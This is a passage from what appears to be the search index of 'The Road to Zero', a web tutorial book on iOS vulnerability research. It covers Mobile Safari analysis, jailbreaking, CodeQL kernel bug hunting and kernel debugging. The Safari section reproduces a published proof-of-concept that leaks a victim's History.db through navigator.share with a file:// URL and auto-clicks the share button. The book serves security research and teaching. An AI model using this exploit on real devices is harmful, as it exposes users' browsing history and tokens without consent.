 Granted all  knowledge is valuable, but time is always going to be finite.  So a trade-off is needed between learning knowledge in case it  might be useful versus learning only what is needed for the job  in hand.</p>"},{"location":"Hammer/#the-hacker-mindset","title":"The hacker mindset","text":"<p>Our path in learning and discovery is aided by a hacker mindset.  This is closely connected to human psychology.  What do humans  do, and what opportunities are indirectly afforded through such  human nature?  There are formal ways of thinking to encourage a  hacker mindset.  We shall explore this in later chapters.</p>"},{"location":"Hammer/#research-goals","title":"Research goals","text":"<p>Looking at security exploits, we can ask what was the  researcher aiming for which resulted in the fruits of the  researcher.  Research is not effective unless there is a  strategic path that is being pursued.  We shall explore this  aspect of security research and show how this can amplify our  efforts.</p>"},{"location":"InspectingMobileSafari/","title":"Inspecting Mobile Safari","text":""},{"location":"InspectingMobileSafari/#why-is-mobile-safari-interesting","title":"Why is Mobile Safari interesting?","text":"<p>The iPhone web browser is Safari, or rather \"Mobile Safari\" because of functionality differences from the desktop \"Safari\".  Web browsers are better thought of as Operating Systems rather than Applications.  They have powerful access into the system, and can dynamically create and run JavaScript code.  Therefore they have their own Sandbox execution environment.  They also present hardware functionality to Web Apps, such as the Microphone and Speaker.  Since users expect a great high-performance experience from the Web, the Web Browser is given the privilege to run dynamically generated code from websites.  If it did not have this privilege, websites would run significantly slower than competitor devices.  This commercial reason is why we have a foothold into the system.  If the Mobile Safari sandbox can be circumvented, an execution chain can be started.</p>"},{"location":"InspectingMobileSafari/#lab-setup","title":"Lab Setup","text":"<p>We assume our host machine is an Apple Silicon based Mac.  It does not have to be this type of Mac or even a system running macOS; it could be a GNU/Linux system.  But for the sake of simplicity we make this assumption.</p> <p>We assume our Mac has the Brew package manager installed.</p> <p>We assume we have an iPod Touch running iOS 13.5 jailbroken, and setup with ssh trust and also an alias for convenience.</p> <pre><code>cat ~/.ssh/config\n</code></pre> <p>on our setup shows <pre><code>Host ipodtouch13_5\n        User root\n        HostName 192.168.1.85\n</code></pre></p> <p>Then we can copy over the <code>MobileSafari</code> app with <pre><code>scp -pr ipodtouch13_5:/Applications/MobileSafari.app /tmp\n</code></pre></p> <p>In order to understand the privileges of this important app, we need to use the <code>ldid</code> tool.  We can get the tool via</p> <pre><code>arch -x86_64 brew install ldid\n</code></pre> <p>The command prefix <code>arch -x86_64</code> ensures the command works from an Apple Silicon Mac.</p>"},{"location":"InspectingMobileSafari/#static-analysis","title":"Static Analysis","text":"<p>Let us first start by doing a static analysis of <code>MobileSafari</code>.  That is, analysing it without running it.</p>"},{"location":"InspectingMobileSafari/#entitlements","title":"Entitlements","text":"<p>It is worthwhile spending some time looking carefully at the entitlements of MobileSafari.  Every entitlement is a privilege, and therefore an opportunity to gain privilege if a vulnerability is found.</p> <pre><code>cd /tmp/MobileSafari.app\nldid -e MobileSafari\n</code></pre> <p>This will produce a lot of output!  One interesting thing to explore is anything Sandbox related.  We can tune our command with a regular expression match as follows:</p> <pre><code>ldid -e MobileSafari | grep -i -B 17 sandbox\n</code></pre> <p>which yields <pre><code>    &lt;key&gt;com.apple.security.exception.mach-lookup.global-name&lt;/key&gt;\n    &lt;array&gt;\n        &lt;string&gt;com.apple.DocumentManagerCore.Downloads&lt;/string&gt;\n        &lt;string&gt;com.apple.proactive.PersonalizationPortrait.NamedEntity.readOnly&lt;/string&gt;\n        &lt;string&gt;com.apple.coreservices.lsbestappsuggestionmanager.xpc&lt;/string&gt;\n        &lt;string&gt;com.apple.suggestd.urls&lt;/string&gt;\n        &lt;string&gt;com.apple.LORemoteUIPinService&lt;/string&gt;\n        &lt;string&gt;com.apple.remotemanagementd.management-state&lt;/string&gt;\n        &lt;string&gt;com.apple.SafariBookmarksSyncAgent&lt;/string&gt;\n        &lt;string&gt;com.apple.Safari.SafeBrowsing.Service&lt;/string&gt;\n        &lt;string&gt;com.apple.SafariCloudHistoryPushAgent&lt;/string&gt;\n        &lt;string&gt;com.apple.mobile.keybagd.xpc&lt;/string&gt;\n        &lt;string&gt;com.apple.parsecd&lt;/string&gt;\n        &lt;string&gt;com.apple.parsec-fbf&lt;/string&gt;\n        &lt;string&gt;com.apple.coreduetd.knowledge&lt;/string&gt;\n        &lt;string&gt;com.apple.internal.safaricyclerd&lt;/string&gt;\n        &lt;string&gt;com.apple.watchlistd.xpc&lt;/string&gt;\n        &lt;string&gt;com.apple.Safari.SandboxBroker&lt;/string&gt;\n</code></pre></p> <p>The same information can be obtained from the Entitlements Cross-Reference website.  It has a searchable index of entitlements for many versions of iOS and macOS.</p> <p>So we now are able to start building a mental model of what Mobile Safari it, and what its attack surface is.  We see the processes, threads, memory, and Mach ports that are used.  We also see all the files that have been opened by <code>MobileSafari</code>.</p>"},{"location":"InspectingMobileSafari/#hidden-functionality","title":"Hidden functionality","text":"<p>The most fruitful way to look at a piece of technology is from the angle of triggering lesser-used functionality, or undocumented functionality.  In practice a software project will grow over time, and new engineers are added to the project and often the original engineers move to other projects or roles.  This means some of the earlier functionality can be less well understood.  Particularly in the beginning of a project, a lot of functionality is offered, but only a subset of functionality becomes popular.  So less used features are often left in the product and later changes to the product can expose bugs, faults and exploitable conditions via the older less used functionality of the software.  The reason why older functionality is not pruned out is because sometimes it is not clear who is still relying on the older functionality.  So it is \"safer\" just to keep it in.  But this attitude allows us opportunities to find bugs and potential exploits.</p>"},{"location":"InspectingMobileSafari/#mobilesafari-url-handlers","title":"<code>MobileSafari</code> URL Handlers","text":"<p>We can explore the URL handler features of MobileSafari by looking at its <code>Info.plist</code> file.</p> <pre><code>plutil -p /tmp/MobileSafari.app/Info.plist\n</code></pre> <p>Amongst the output we see: <pre><code>\"CFBundleURLTypes\" =&gt; [\n    0 =&gt; {\n      \"CFBundleURLIsPrivate\" =&gt; 1\n      \"CFBundleURLName\" =&gt; \"Web App URL\"\n      \"CFBundleURLSchemes\" =&gt; [\n        0 =&gt; \"webclip\"\n      ]\n    }\n    1 =&gt; {\n      \"CFBundleURLName\" =&gt; \"Web site URL\"\n      \"CFBundleURLSchemes\" =&gt; [\n        0 =&gt; \"http\"\n        1 =&gt; \"https\"\n      ]\n    }\n    2 =&gt; {\n      \"CFBundleURLName\" =&gt; \"FTP URL\"\n      \"CFBundleURLSchemes\" =&gt; [\n        0 =&gt; \"ftp\"\n      ]\n    }\n    3 =&gt; {\n      \"CFBundleURLName\" =&gt; \"Web Search URL\"\n      \"CFBundleURLSchemes\" =&gt; [\n        0 =&gt; \"x-web-search\"\n      ]\n    }\n    4 =&gt; {\n      \"CFBundleURLIsPrivate\" =&gt; 1\n      \"CFBundleURLName\" =&gt; \"MobileSafari Tab URL\"\n      \"CFBundleURLSchemes\" =&gt; [\n        0 =&gt; \"com-apple-mobilesafari-tab\"\n      ]\n    }\n  ]\n</code></pre></p>"},{"location":"InspectingMobileSafari/#handling-x-web-search","title":"Handling <code>x-web-search</code>","text":"<p>We saw earlier that <code>MobileSafari</code> has a URL handler <code>x-web-search</code></p> <p>From some research on Google and Stack Overflow we can come up with some code to trigger such functionality.</p> <p>It turns out that the best technology stack to do experimentation and exploit development is to use Objective-C because this gives us the fewest number of abstraction layers between our code and the system.  Objective-C is also more amenable to hacking because it is less type-safe than Swift.  We can craft malicious message calls and call private APIs easily.</p> <p>In our case, we just make a standard API call as follows: <pre><code>- (void)viewDidLoad {\n    [super viewDidLoad];\n    // Do any additional setup after loading the view.\n    [[UIApplication sharedApplication] openURL:[NSURL URLWithString:@\"x-web-search://?toast\"]\n                                       options:@{}  completionHandler:^(BOOL success) {\n        NSLog(@\"status %ld\", (long)success);\n    }];\n}\n</code></pre></p> <p>This indeed will launch the browser and perform a search for \"toast\" using the default search engine.</p>"},{"location":"InspectingMobileSafari/#dynamic-analysis","title":"Dynamic Analysis","text":"<p>We now switch to doing a dynamic analysis of <code>MobileSafari</code>.</p>"},{"location":"InspectingMobileSafari/#process-explorer","title":"Process Explorer","text":"<p>There is a useful tool which allows us to explore a given process on the iDevice and this exposes a lot of low level detail.  It is called <code>procexp</code> by Jonathan Levin.</p> <p>We install the tool by installing it onto our Mac: <pre><code>arch -x86_64 brew install procexp\n</code></pre></p> <p>and then we transfer it onto our iDevice: <pre><code>scp /usr/local/bin/procexp ipodtouch13_5:/tmp\n</code></pre></p> <p>We then manually launch Safari on the iDevice.  Once it has launched we can send commands to the device and locally store the results on our Mac.</p> <pre><code>ssh ipodtouch13_5 ps -ef | grep MobileSafari\n  501 99988     1   0  4:06PM ??         0:03.45 /Applications/MobileSafari.appMobileSafari\n</code></pre> <p>Note that the <code>| grep MobileSafari</code> portion runs on our Mac, and the <code>ps -ef</code> portion runs on the iDevice.</p> <p>Now from the output of <code>ps</code> we know that the second number is the process identifier (PID).  We can run procexp against this:</p> <pre><code>ssh ipodtouch13_5 /tmp/procexp 99988 all &gt; mobile_safari.procexp.txt\n</code></pre> <p>The full output file, mobile_safari.procexp.txt, is kept on our Mac.</p> <p>The output file is quite large, so we'll show a truncated excerpt below:</p> <pre><code>-----------------\nProcess: 99988  Name: MobileSafari      Parent:     1   Status: runnable\nContainer: /private/var/mobile/Containers/Data/Application/FDFCAC6B-8E4F-4381-B354-C0DEAB28D32B\nFlags:   64-bit,called exec,session leader,App\n\nExtmods: Task shows no signs of external modification or tampering\nCode signing: valid,get-task-allow,installer,require enforcement,require library validation\n\nUID:      501   RUID:   501     SVUID:   501\nGID:      501   RGID:   501     SVGID:   501\n\nVirtual size:           4312M (4522409984)      Resident size:          31M (33226752)\nTime:     00.08   =    00.08 (User)    +    00.00 (System)\nSyscalls:       38961   Mach Traps:   34832\nDisk I/O:      55852K Read            25532K Written\nNo Network I/O detected for this process\n\n#Threads:   6     Workqueues:3 threads (3 running, 0 blocked) State: 0\nThread Info:\n\n(0)                    0x75d0c88f 0000000100180000-0000000100380000 [   2M]r-x/r-x COW /Applications/MobileSafari.app/MobileSafari\n(0)                    0x75d0c88f 0000000100380000-0000000100394000 [  80K]r--/rw- PRV /Applications/MobileSafari.app/MobileSafari\n.\n.\nShared PMAP            0x00000000 0000000270000000-0000000280000000 [ 256M]r--/r-- NUL\n\nProcess Hierarchy:\n 99988 MobileSafari  has no children\n\n46 File descriptors: MobileSafari     99988 FD  0r  /dev/null @0x0\nMobileSafari     99988 FD  1u  /dev/null @0x0\nMobileSafari     99988 FD  2u  /dev/null @0x317\nMobileSafari     99988 FD  3u  /private/var/mobile/Library/Safari/Bookmarks.db @0x0\n.\n.\nMobileSafari     99988 FD 29u  /private/var/mobile/Library/Safari/History.db @0x0\nMobileSafari     99988 FD 30u  /private/var/mobile/Library/Safari/History.db-wal @0x0\nMobileSafari     99988 FD 31u  /private/var/mobile/Library/Safari/History.db-shm @0x0\n.\n.\nMobileSafari     99988 FD 45u  /private/var/mobile/Library/Safari/Bookmarks.db @0x0\nJetsam Level: 0\nThread policy version\n        PID : 99988 (399071), comm: MobileSafari Flags: PID Suspended, Frozen, DarwinBG, Live Donor, WQ Flags avail\n        Size: 18M Max Res: 75M\n        IOStats: Disk Reads: 1688 reads (57192448 bytes), 54 writes (26144768 bytes)\n\n                TID: 3721957 State: Waiting  PRI: 4/4 Flags: DarwinBG, Suspended \n                Continuation: 0xfffffff007118af8 (no kernel stack)\n                CPU Times: User: 0.612410 secs, System: 0.000000 secs\n                Backtrace:\n                Frame 0: 0x1b08b3198\n                Frame 1: 0x1b08b260c\n                Frame 2: 0x1b0a5d468\n                Frame 3: 0x1b0a5849c\n                Frame 4: 0x1b0a57ce8\n                Frame 5: 0x1baba238c\n                Frame 6: 0x1b4b86444\n                Frame 7: 0x100186770\n                Frame 8: 0x1b08df8f0\n                Frame 9: 0x0\n\n                IOStats: Disk Reads: 592 reads (19787776 bytes), 2 writes (8192 bytes)\n.\n.\nMobileSafari:99988:0x103        task, kernel 0x79c64c07\nMobileSafari:99988:0x203\nMobileSafari:99988:0x303        (thread) 0x79d853e7\nMobileSafari:99988:0x403\nMobileSafari:99988:0x507\nMobileSafari:99988:0x603\nMobileSafari:99988:0x707        (HSP: Coalition)-&gt;launchd:1:0x1103\nMobileSafari:99988:0x803        (clock) 0x72b03a4f\nMobileSafari:99988:0x903        (semaphore) 0x7a8ec76f\nMobileSafari:99988:0xa03\nMobileSafari:99988:0xb03        (voucher) 0x73ec9147\nMobileSafari:99988:0xc03\nMobileSafari:99988:0xd07        &lt;-notifyd:58084:0xcf0b\nMobileSafari:99988:0xe03        &lt;-logd:58032:0x2bb0b\nMobileSafari:99988:0xf03        -&gt;logd:58032:0x52713\nMobileSafari:99988:0x1003       &lt;-cfprefsd:58085:0x27773\nMobileSafari:99988:0x1103       -&gt;logd:58032:0x1b803\n.\n.\nMobileSafari:99988:0x15123      -&gt;ContextService:58199:0x2f13\nMobileSafari:99988:0x15217      \"com.apple.cloudd\"      -&gt;cloudd:58141:0x2603\nMobileSafari:99988:0x1530f\n</code></pre>"},{"location":"InspectingMobileSafari/#mobilesafari-history-exploit","title":"<code>MobileSafari</code> History Exploit","text":"<p>There is a vulnerability which can be exploited from the output of the process explorer.  We notice that the <code>MobileSafari</code> app uses predictable paths for sensitive resources, such as the browsing history.</p> <p>From <pre><code>MobileSafari     99988 FD 29u  /private/var/mobile/Library/Safari/History.db @0x0\n</code></pre></p> <p>we see it opens the file (with a predictable path) <pre><code>/private/var/mobile/Library/Safari/History.db\n</code></pre></p> <p>In an exploit documented at https://blog.redteam.pl/2020/08/stealing-local-files-using-safari-web.html by Pawel Wylecial, it was demonstrated that when performing a Share the Share URL is not constrained to the web page resources.  Private resources via the <code>file://</code> schema are supported so this means a malicious share URL can leak sensitive information.</p> <p>The malicious Javascript code is: <pre><code>&lt;script&gt;\nvar opts = {\ntext: 'check out this cute kitten! http://somerandomimagewebsite.com/cat.jpg\\n\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n',\nurl: 'file:///private/var/mobile/Library/Safari/History.db'};\n\nfunction run() {\n navigator.share(opts);\n}\n&lt;/script&gt;\n</code></pre></p> <p>A button action runs this code: <pre><code>&lt;button id=\"share-btn-id\" class=\"button button1\" onclick='run();'&gt;\nShare this photo&lt;/button&gt;\n</code></pre></p> <p>The containing app even clicks on this button on behalf of the user so they are only left with picking the share target: <pre><code>extension ViewController: WKNavigationDelegate {\n    func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {\n        if !autoPressedButton {\n            webViewOutlet.evaluateJavaScript(\n            \"document.getElementById('share-btn-id').click()\") { (_, error) in\n                if error == nil {\n                    self.autoPressedButton = true\n                }\n            }\n        }\n    }\n}\n</code></pre></p> <p>To demonstrate the vulnerability with a free standing app, see <code>examples/history</code> from the The Road to Zero GitHub website.  This app merely loads a malicious web page, which has a link to file:///private/var/mobile/Library/Safari/History.db, and upon loading, will also automatically click the share button, so all the user has to do is to pick the sharing target, such as Messages.</p>         Mobile Safari Share Vulnerability    <p>Once shared, the recipient can view the website browsing history of the victim using a simple SQL Lite command having first saved the <code>History.db</code> file locally on a Mac.  We see output similar to the below:</p> <pre><code># sqlite3 ~/Downloads/History.db\nSQLite version 3.36.0 2021-06-18 18:58:49\nEnter \".help\" for usage hints.\nsqlite&gt; .dump\nPRAGMA foreign_keys=OFF;\nBEGIN TRANSACTION;\nCREATE TABLE history_items (id INTEGER PRIMARY KEY AUTOINCREMENT,url TEXT NOT NULL UNIQUE,domain_expansion TEXT NULL,visit_count INTEGER NOT NULL,daily_visit_counts BLOB NOT NULL,weekly_visit_counts BLOB NULL,autocomplete_triggers BLOB NULL,should_recompute_derived_visit_counts INTEGER NOT NULL,visit_count_score INTEGER NOT NULL);\nINSERT INTO history_items VALUES(1206,'https://www.theiphonewiki.com/w/index.php?search=Cydia%20Impactor&amp;title=Special%3ASearch','theiphonewiki',1,X'14000000',NULL,NULL,0,20);\nINSERT INTO history_items VALUES(1207,'https://onedrive.live.com/?cid=STUFFYOUSHOULDNOTSEE&amp;authkey=SOMETHINGELSESENSITIVE','onedrive.live',1,X'14000000',NULL,NULL,0,20);\nINSERT INTO history_items VALUES(1209,'http://www.cydiaimpactor.com/','cydiaimpactor',3,X'34000000',NULL,NULL,0,52);\n.\n.\n</code></pre> <p>Clearly this demonstrates that the victim had visited the iPhone Wiki and Cydia Impactor websites, and also had used Microsoft One Drive.  Critical tokens were also leaked but have been censored from the above verbose dump.</p>"},{"location":"InspectingMobileSafari/#documenting-the-journey","title":"Documenting the Journey","text":"<p>We have just scratched the surface of <code>MobileSafari</code>.  In a way we have half-cheated.  We did not find a zero day from our own efforts but we did find interesting information.  When correlated to an actual exploit we can see what we have done would have taken us a step closer to the exploit. The item we found was that the <code>MobileSafari</code> had opened a sensitive file path which we discovered.  A separate vulnerability is that it allowed sharing of items with the <code>file://</code> URL schema; it is not something we figured out.  But if we had, then we would have had a reasonable stab at a hack because we would know what URL path to supply to the <code>file://</code> URL.</p> <p>When we explore a system, it is worthwhile documenting our journey as we go.  We have seen that merely by running commands in a fashion that send back the output to our Mac allows us to retain a record of what we found.  It is not much effort to wrap such analysis into a Markdown file with simple notes, and links to web resources.  These files naturally can be placed under version control.</p> <p>Hacking is all about the details.  Sometimes our experiments are fruitless.  But if we have a good record of what we have done, then at a later point in time when we get another idea, we can work back through our notes and possible recommence a failed approach but with a new angle of attack.</p> <p>When we are successful in creating a zero-day, often there is a write-up done after the event (for example when the bug has been fixed and customers have updated to using the fix).  Documenting the journey means we will have a valuable resource for writing a blog post, for example.</p>"},{"location":"Introduction/","title":"Introduction","text":"<p>This web-based book is about Zero Day Vulnerabilities.</p> <p>It is called \"The Road to Zero\" because it is primarily a tutorial guide to take you along the path needed to find your own vulnerabilities.</p> <p>The focus of our book is iOS.  In fact, when we talk about iOS we often mean the family of Operating Systems from Apple that are based around the same underpinnings.  It would be more accurate to say this book focusses on Darwin, the common UNIX and NeXT technology stack from which macOS, iOS, tvOS, and watchOS are derived.</p> <p>Likewise when we refer to a device, we say iDevice because there are lots of different Apple produced products in different device classes, such as various models of iPhone, iPod or iPad.</p> <p>There will be a companion Udemy course to accompany the book.  Hopefully this will accomodate different learning styles.  The book is better for drilling into subtle details, but the videos are better to getting a sense of the interactive and exploratory aspects of vulnerability hunting.  The book will remain cost free, and the Udemy course will be at a reasonable cost.</p>"},{"location":"JailbreakSetup/","title":"Jailbreak Setup","text":"<p>In order to explore the iOS attack surface directly we need to explore the iOS system using diagnostic tools.  Such tooling is not available under normal circumstances.</p> <p>Apple engineering will be able to diagnose and explore iOS using specially constructed iPhones, so-called \"Dev Fused\" hardware.  This provides full access to the iPhone.</p> <p>External engineers on the Security Research Device programme (see @applesrd) will be able to access a similiar phone, called a \"SRD Fused\" hardware.  This provides ssh access to the iPhone.  Such engineers can choose any entitlements and therefore can run any software on the phone.</p> <p>Approved organisations can get access to a virtualization as a service platform from Corellium which provides a diagnostic experience from kernel level to any iOS OS image that we upload to test. (See @corelliumvirtualdevices)</p> <p>Ordinary customers use production iPhones, \"Prod Fused\" hardware.  These have the full set of security restrictions of an iPhone. (See @srdhowworks)</p> <p>The workaround that most zero day researchers use is to take Prod Fused hardware, and keep the software an an old iOS revision, potentially also staying on old hardware.  Over time, software might be released to circumvent the security restrictions of our iDevice.  Staying on old hardware increases the likelyhood of such software become available since the latest hardware protections schemes might not have a public exploit.</p> <p>Using software to exploit vulnerabilities to permit elevated access to the iDevice is called Jailbreaking.  Because the software and hardware restrictions keep our software \"Jailed\" by denying freedom to access arbitrary system resources.  Jailbreaks break us out from such a Jail.  Note, the word \"Jail\" can be traced back to the original concept Jails: Confining the omnipotent root. in FreeBSD.</p>"},{"location":"JailbreakSetup/#types-of-jailbreak","title":"Types of Jailbreak","text":"<p>There are different levels by which access restrictions can be disabled on an iDevice.  The key differentiator is what happens to the device when it is booting up, such as during power on or a restart, and whether manual steps are needed following boot up.</p> <p>In this section, tethering means physically connecting the iDevice to a computer with a cable (the tether) and running special software on the computer.  Tethering is significant because in practice mobile devices are no longer very \"mobile\" when they need to be hooked up to a computer albeit a laptop.</p> <p>The different types of jailbreak are:</p> <ul> <li>Tethered; must boot using a computer, without a computer it will not boot</li> <li>Semi-tethered; may boot using a computer (to get jailbreak functionality), or boot without a computer (to get normal functionality) </li> <li>Untethered; can boot without a computer and will get jailbreak functionality</li> <li>Semi-untethered; can boot without a computer to get normal functionality, run an on-device app to apply the jailbreak</li> </ul> <p>This can be summarized in the following table.</p>    Type Tethered reboot Untethered reboot After JB app     Tethered Jailbroken Hangs or Crashes N/A   Semi-tethered Jailbroken Normal Functionality N/A   Untethered N/A Jailbroken N/A   Semi-untethered N/A Normal Functionality Jailbroken    <p>For our purposes, any of the above approaches are acceptable because we shall be mostly working on our laytop/desktop computer and remotely connecting to our iDevice, which will typically be physically connected as well.  In practice, the most common form of jailbreak is the Semi-untethered jailbreak.</p>"},{"location":"JailbreakSetup/#jailbreak-shopping-list","title":"Jailbreak shopping list","text":"<p>There are many jailbreak software programs, many hardware variants.  The steps to follow also vary with the jailbreak itself.  Rather than track these rapidly evolving factors, some broad guidance is given here.</p> <ol> <li>We take note of the local laws.  It seems that in USA, and most countries, jailbreaking for (@jailbreakingallowed)</li> <li>We need a Mac running macOS.  Other options are possible but there is a smaller user base for alternative configurations, so the out-of-the-box experience might not be as smooth.</li> <li>Beware of scams, as Jailbreak tools should be free in cost.  The best anchor point to reach download sites is to start from https://www.theiphonewiki.com  This is the primary resource site which encapsulates the latest knowledge of tools, phones, and techniques.</li> <li>We need a paid Apple developer account.  This allows us to re-sign the app install files, known as <code>.IPA</code> files.</li> <li>We need to enable an application specific password for our Paid Developer account.  (See @appspecificpassword)</li> <li>We need and old iDevice.  Perhaps a second hand one, or one that we had used in the past before upgrading, or a cosemetically damaged phone.  A good choice is an iPod Touch, 7th generation.  This is not too old, quite cheap, but has many options for jailbreaking.  Such devices will likely have a long life because they are often embedded to other hardware such as point of sale terminals.</li> </ol>"},{"location":"JailbreakSetup/#example-jailbreak-steps","title":"Example Jailbreak steps","text":"<p>Whilst the specific details will depend on our software and hardware versions, a typical jailbreak involves steps similar to the following:</p> <ol> <li>Confirm our Mac is running with Xcode, and can deploy a trivial app to our phone.</li> <li>Update the Apple ID to have a application specific password.</li> <li>Download the Unc0ver jailbreak.</li> <li>Download the Cydia Impactor Tool and install it.</li> <li>Drag the Unc0ver IPA file onto Cydia Impactor.</li> <li>Supply the Apple ID, and the application specific password.</li> <li>Follow the On-Device prompts in the Unc0ver app, and then let it reboot.</li> <li>Enable ssh on the iDevice and change the <code>root/alpine</code> credentials to something unique.</li> </ol>"},{"location":"KernelBugHunting/","title":"Kernel Bug Hunting","text":"<p>It is generally the case that the barriers to finding and exploiting are getting higher.  But there is good news also. In this chapter we describe how to use an automated approach to finding vulnerabilities in the XNU kernel.</p>"},{"location":"KernelBugHunting/#outline-of-approach","title":"Outline of Approach","text":"<p>We need a number of things setup before we can proceed.  Here we've made some assumptions and choices on configuration and setup which we hope can be adapted for your requirements and preferences.</p> <p>We assume our bug hunting is done with: - Apple Silicon ARM architecture - Visual Studio is our editor for querying for, and viewing results - XNU Kernel <code>xnu-8792.61.2</code> is being studied</p> <ol> <li>Setup for Xcode on Mac on Apple Silicon.</li> <li>Install the Kernel Development Kit.</li> <li>Download and compile the XNU kernel source.</li> <li>Setup and install Visual Studio Code, and the QL plug-in.</li> <li>Install CodeQL helper snippets.</li> <li>Generate XNU CodeQL database.</li> <li>Import snippets into Visual Studio</li> <li>Import XNU CodeQL database.</li> <li>Run CodeQL queries to find weaknesses and vulnerabilities. </li> </ol>"},{"location":"KernelBugHunting/#sample-visualization","title":"Sample Visualization","text":"<p>Before we get into the details of what we are setting up, let's jump into what we can expect to end up with.</p> <p>OverallExample</p> <p>The workflow is to select a snippet to query for.  Here we picked one that looks for empty blocks:</p> <p>PickASnippet</p> <p>Then we right-click to get the context menu and select the \"Run Query\" option.</p> <p>RightClickRunQuery</p> <p>Lastly, we inspect the matched source code files.</p> <p>InspectSourceFile</p>"},{"location":"KernelBugHunting/#collect-needed-software","title":"Collect needed software","text":"<p>We need the following software:</p>    Name Purpose Location     Xcode Compiler Mac App Store   Kernel Development Kit (13.1 22C65) XNU Dependency for compilation Apple Download Site   <code>xnu-build</code> Build Scripts for XNU pwn0rz/xnu-build   Visual Studio Code Editor/Viewer Microsoft VS Code   CodeQL plug-in Integration for CodeQL into VS Code <code>Extensions</code> in VS Code; <code>CodeQL</code>   CodeQL snippets Pre-made queries to run Starter Workspace"},{"location":"KernelDebugging/","title":"Kernel Debugging","text":"<p>There is a good textbook on the Darwin family of Operating Systems; see *OS Internals.  In this chapter however, we aim for a practical hands-on approach, and defer theory until later on our journey.</p> <p>Discovering 0-days is mostly a practical exercise, accompanied by a knowledge of strategy, a bedrock of theory, and a toolchain of reverse engineering tools.</p> <p>In the same way that beginner programmers, particularly from an academic training, try to design and architect their system before starting to code (and thus missing information and hitting knowledge gaps), beginner hackers try to read everything about the target system before cracking them.  Hacking is mostly a journey of discovery just like software engineering.  Only trivial, or previously well practiced systems are ameniable to big up-front design approaches.  Also, knowing less about a system can sometimes be advantageous because new avenues are tried or novel approaches are discovered.</p>"},{"location":"KernelDebugging/#booting-and-exploring-a-development-kernel","title":"Booting and exploring a Development Kernel","text":"<p>This section is a practical tutorial on how to setup a system for interactive kernel level debugging.</p> <p>At a high level, this is our workflow:</p>"},{"location":"KernelDebugging/#data-safety","title":"Data Safety","text":"<p>Experimenting with kernels can be like playing with fire.  The target machine must be throwaway; it might end up no longer booting, or be stuck in a boot loop.  The data on its disk might get corrupted or lost.  It is important to set up a discipline of keeping our work machine separate from our lab machine.  Furthermore, it is good to have different login identities and credentials between these two environments.  For example we wouldn't want a quirk in a beta environment causing corruption to an iCloud resource we rely upon in our work environment.</p> <p>Unfortunately good \"data hygiene\" is mostly learnt after a painful data loss.  To avoid this, it is best to have in place a good backup strategy before experimenting with lab environments, and potential unsafe configurations and software.  One such strategy is to have all our code in a cloud service provider, such as GitHub, have our documents and photos mirrored to iCloud, have our desktop systems backed-up to Time Machine and the high value personal documents, license keys, etc. kept also on Write-Only DVD media.</p>"},{"location":"KernelDebugging/#terminology","title":"Terminology","text":"<p>Here we adopt some standard terminology to describe our test environment.</p>    Item Description     target debugee This system is being tested and inspected   host debugger This system is driving the probing and analysis"},{"location":"KernelDebugging/#required-hardware","title":"Required Hardware","text":"<p>It is surprisingly helpful to collect a random collection of old computers, peripherals, and connectors.  Sometimes an interesting vulnerability is seen only on old hardware, or a technique is only useable on old hardware. Variety is the key so that different types of lab setups are possible.</p> <p>In this tutorial we use a MacBook Pro target which has native USB-C interfaces. We connect a Thunderbolt USB-C to Thunderbolt adapter, and then connect a Thunderbolt Gigabit Ethernet Adapter to the Thunderbolt interface.  Then we connect the ethernet cable to the host computer.  The host computer is a Mac Mini based upon Apple Silicon.</p> <p>This choice of hardware comes from particular requirements.</p>"},{"location":"KernelDebugging/#direct-thunderbolt-communication","title":"Direct thunderbolt communication","text":"<p>When a system boots up, early on in its bring-up, it has few hardcoded facilities immediately at its disposal.  The kernel will not have brought up its networking stack fully.  This means for debug communication, it can only use a few hard coded facilities.  The Kernel Development Kit from Apple documents what hardware is supported.  It basically maps to either direct on-thunderbolt ethernet adapters or FireWire based connections.</p> <p>The FireWire\\index{trademark!FireWire} based communication is less flexible than Ethernet and is more of a legacy interface.  So we shall ignore that option in this tutorial.</p> <p>We can use either the Gigabit Ethernet adapters or the 10 Gigabit Ethernet adapters (for Mac Pro\\index{trademark!Mac Pro}) from Apple.  A USB Ethernet adapter will not work because it won't be able to route the debug communication packet onto that device.</p> <p>Note that most all-in-one adapters that connect to USB-C and offer a variety of ports including Ethernet will not work because the internal archictecture of these will have a USB Bus, and then there will be an affordable but lower performance Ethernet chip, such as a RealTek\\index{trademark!RealTek}.  There are two problems here.  Firstly the RealTek is not a supported chip for debug communication, and secondly the kernel cannot route the debug packet from the Thunderbolt bus onto the USB bus where the Ethernet chip resides.</p> <p>Notice that in our setup we first convert USB-C to Thunderbolt, and then convert Thunderbolt to Gigabit Ethernet.  One advantage of our setup is that is it more flexible.  Not all computers have native USB-C, but having two adapters means we have the flexibility to debug older computers.</p>"},{"location":"KernelDebugging/#using-a-laptop-target","title":"Using a laptop target","text":"<p>One convenience arising from choosing a laptop as the debug target is that we can map the power key to halt the kernel and drop into the debugger.  Also since the keyboard and trackpad are integrated, it means we have direct connectivity into the system.</p>"},{"location":"KernelDebugging/#required-software","title":"Required Software","text":"<p>In order to do kernel debugging conveniently, we need a kernel with its debug symbols available so we can set symbolic breakpoints.  We get the kernel version from the target machine as follows:</p> <pre><code>target-mbp2018 # sw_vers\nProductName:    macOS\nProductVersion: 11.3\nBuildVersion:   20E5186d\n</code></pre> <p>We need to get the matching Kernel Development Kit (KDK) from the Apple developer website @devapplemore We search for it using the build version, and it either it matches exactly, such as \"Kernel Debug Kit 11.3 build 20E5186d\", or it is not found.  When it is not found, we are supposed to raise a developer support ticket to ask for it to be uploaded onto the Apple Website.  An easier alternative is to just update our version of macOS to a version which is also shown on the @devapplemore website.</p> <p>The KDK software is needed both on the target (we shall install the development kernel on it), and on the host (we need it available so the debugger can reference it).  An exact same KDK must be used on both target and host.</p>"},{"location":"KernelDebugging/#disable-file-vault","title":"Disable File Vault","text":"<p>In order to manipulate the root file system when in Recovery Mode, we need to first disable File Vault.  This is normally a background task and takes a while but is immediate on our MacBook Pro because its disk is managed by a T2 chip.  (@disablefilevault)</p> <ol> <li>Use <code>System Preferences &gt; Security &amp; Privacy &gt; FileVault</code></li> <li>Unlock the padlock.</li> <li>Click <code>Turn off FileVault</code></li> </ol> <p>Allow the system to process the decryption in the background.  We must keep our system connected by AC power the whole time to achieve 